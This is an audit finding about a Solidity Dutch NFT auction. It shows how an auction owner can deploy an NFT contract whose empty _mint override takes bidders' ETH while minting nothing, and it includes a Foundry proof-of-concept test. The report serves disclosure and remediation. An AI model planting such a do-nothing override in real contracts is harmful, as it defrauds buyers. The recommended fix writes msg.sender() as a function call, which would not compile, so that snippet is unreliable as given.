# [H] Auction owner can grief the auction bidders with a malicious MeritNFT

## Summary
Severity: High
Reporter: R-Nemes
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L156C1-L159C10
Type: audit-issue

## Details
# Auction owner can grief the auction bidders with a malicious MeritNFT

## Summary
It is possible to create a malicious MeritNFT in which the owner could override the `_mint` function to do nothing without reverting, thereby griefing the auction bidder by taking the purchase price and giving nothing in return.

## Vulnerability Detail
The provided test contract showcases the vulnerability. By creating a malicious MySuperHypedNFT contract, the `_mint` function is overridden to do nothing. When the `mint` function of the `MeritDutchAuction` is called, the malicious NFT contract can successfully complete the minting process without raising an error or reverting, causing the auction purchaser to lose their ETH payment without receiving the NFT.

## Impact
The impact of this vulnerability is that the auction bidder spends ETH on the NFT but ends up receiving nothing in return.

## Code Snippet
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/MeritNFT.sol";
import "../src/MeritDutchAuction.sol";

contract MySuperHypedNFT is MeritNFT {
    constructor(
        string memory name,
        string memory symbol,
        string memory baseURI,
        address uriSetter,
        address auction
    ) MeritNFT(name, symbol, baseURI, uriSetter, auction) {}

    function _mint(address to, uint256 tokenId) internal override {
    }
}

contract AttackTest is Test {
    string constant NAME = "Merit NFT";
    string constant SYMBOL = "MERIT";
    string constant BASE_URI = "https://example.com/";

    address constant wallet1 = address(0xffffffff1);
    address constant wallet2 = address(0xffffffff2);
    address constant wallet3 = address(0xffffffff3);
    address constant owner = address(0xffffffff4);
    address constant uriSetter = address(0xffffffff5);

    uint256 constant START_PRICE = 1e18;
    uint256 constant END_PRICE = 0.1e18;
    uint256 constant AUCTION_DURATION = 2 hours;
    uint256 constant STEP_SIZE = 12 minutes;

    uint256 public startTime;
    uint256 public endTime;

    MeritNFT public nft;
    MeritDutchAuction public auction;

    function setUp() public {
        vm.startPrank(owner);

        startTime = block.timestamp + 1 days;
        endTime = startTime + AUCTION_DURATION;

        auction = new MeritDutchAuction(
            START_PRICE,
            END_PRICE,
            startTime,
            endTime,
            STEP_SIZE
        );

        nft = new MySuperHypedNFT(NAME, SYMBOL, BASE_URI, uriSetter, address(auction));
        auction.setNFT(address(nft));

        // Gift eth to test addresses
        vm.deal(wallet1, 1000000e18);
        vm.deal(wallet2, 1000000e18);
        vm.deal(wallet3, 1000000e18);

        vm.stopPrank();
    }

    function testMaliciousNFT() public {
        vm.startPrank(wallet1);
        uint256 balanceBefore = wallet1.balance;
        vm.warp(startTime);
        auction.mint{value: START_PRICE}(1);
        uint256 balanceAfter = wallet1.balance;

        assertEq(auction.minted(), 1);
        assertEq(auction.totalRaised(), START_PRICE);
        assertEq(address(auction).balance, START_PRICE);
        assertEq(auction.mintedPerAddress(wallet1), 1);

        vm.expectRevert("ERC721: invalid token ID"); // Wallet1 does not own the NFT
        nft.ownerOf(1);

        assertEq(balanceBefore - balanceAfter, START_PRICE); // Wallet1 did pay the price
        vm.stopPrank();
    }

}

```

## Tool used
Manual Review + Foundry

## Recommendation
To mitigate this vulnerability, it is recommended to add a check after the call to `nft.mint` to ensure that the ownership of the minted token has been successfully assigned to the purchaser. This check can be implemented as follows:

[MeritDutchAuction.sol#L156C1-L159C10](https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L156C1-L159C10)

```solidity
for(uint256 i = 0; i < amount; i++) {
	// Mint the amount of NFTs to the sender
	nft.mint(mintedBefore + i + 1, msg.sender);
	require(nft.ownerOf(mintedBefore + i + 1) == msg.sender(), "Mint failed");
}
```
By adding this check, the mint function will revert if the ownership of the minted token is not successfully assigned to the purchaser, preventing the scenario where the purchaser loses their payment without receiving the NFT.

This recommendation ensures the integrity of the auction process and protects the purchasers from potential malicious actions by the NFT contract owner.
